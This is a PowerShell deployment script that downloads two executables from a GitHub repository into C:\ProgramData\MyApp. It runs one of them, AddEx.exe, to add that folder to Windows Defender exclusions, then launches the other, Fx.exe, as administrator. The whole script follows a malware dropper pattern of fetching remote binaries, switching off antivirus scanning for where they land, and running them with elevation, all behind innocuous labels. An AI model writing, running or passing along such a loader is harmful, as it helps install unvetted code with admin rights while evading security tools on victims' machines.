# ===============================================
# SCRIPT: DEPLOY FX WITH EXCLUSIONS
# ===============================================

# -------------------------------------------------
# 1. CONFIGURATION
# -------------------------------------------------
$URL_FX = "https://github.com/kilordow/Fx.exe/raw/refs/heads/main/Fx.exe"
$URL_ADDEX = "https://github.com/kilordow/Fx.exe/raw/refs/heads/main/AddEx.exe"
$TARGET_DIR = "C:\ProgramData\MyApp"
$FX_PATH = "$TARGET_DIR\Fx.exe"
$ADDEX_PATH = "$TARGET_DIR\AddEx.exe"

# -------------------------------------------------
# 2. CREATE TARGET FOLDER IF NOT EXISTS
# -------------------------------------------------
Write-Host "[1/5] Checking folder: $TARGET_DIR" -ForegroundColor Cyan
if (-not (Test-Path $TARGET_DIR)) {
    New-Item -ItemType Directory -Path $TARGET_DIR -Force | Out-Null
    Write-Host "      Folder created." -ForegroundColor Green
} else {
    Write-Host "      Folder exists." -ForegroundColor Green
}

# -------------------------------------------------
# 3. DOWNLOAD FX.EXE
# -------------------------------------------------
Write-Host "[2/5] Downloading Fx.exe..." -ForegroundColor Cyan
try {
    Invoke-WebRequest -Uri $URL_FX -OutFile $FX_PATH -ErrorAction Stop
    Write-Host "      Success: $FX_PATH" -ForegroundColor Green
} catch {
    Write-Host "      ERROR: $_" -ForegroundColor Red
    exit 1
}

if (-not (Test-Path $FX_PATH)) {
    Write-Host "      CRITICAL: Fx.exe not found after download." -ForegroundColor Red
    exit 1
}

# -------------------------------------------------
# 4. DOWNLOAD ADDEX.EXE
# -------------------------------------------------
Write-Host "[3/5] Downloading AddEx.exe..." -ForegroundColor Cyan
try {
    Invoke-WebRequest -Uri $URL_ADDEX -OutFile $ADDEX_PATH -ErrorAction Stop
    Write-Host "      Success: $ADDEX_PATH" -ForegroundColor Green
} catch {
    Write-Host "      ERROR: $_" -ForegroundColor Red
    Write-Host "      Continuing without AddEx.exe" -ForegroundColor Yellow
}

# -------------------------------------------------
# 5. RUN ADDEX.EXE TO ADD FOLDER TO DEFENDER EXCLUSIONS
# -------------------------------------------------
if (Test-Path $ADDEX_PATH) {
    Write-Host "[4/5] Running AddEx.exe to add folder to Defender exclusions..." -ForegroundColor Cyan
    try {
        Start-Process -FilePath $ADDEX_PATH -Wait
        Write-Host "      AddEx.exe finished. Folder should be in exclusions." -ForegroundColor Green
    } catch {
        Write-Host "      Failed to run AddEx.exe: $_" -ForegroundColor Red
    }
} else {
    Write-Host "[4/5] Skipping: AddEx.exe not found." -ForegroundColor Yellow
}

# -------------------------------------------------
# 6. RUN FX.EXE AS ADMINISTRATOR
# -------------------------------------------------
Write-Host "[5/5] Running Fx.exe as Administrator..." -ForegroundColor Cyan
try {
    Start-Process -FilePath $FX_PATH -Verb RunAs
    Write-Host "      Fx.exe launched." -ForegroundColor Green
} catch {
    Write-Host "      Failed to run Fx.exe: $_" -ForegroundColor Red
}

# -------------------------------------------------
# 7. DONE
# -------------------------------------------------
Write-Host "`nDONE. All files in: C:\ProgramData\MyApp" -ForegroundColor Cyan
Write-Host "Window will close in 5 seconds." -ForegroundColor Gray
Start-Sleep -Seconds 5
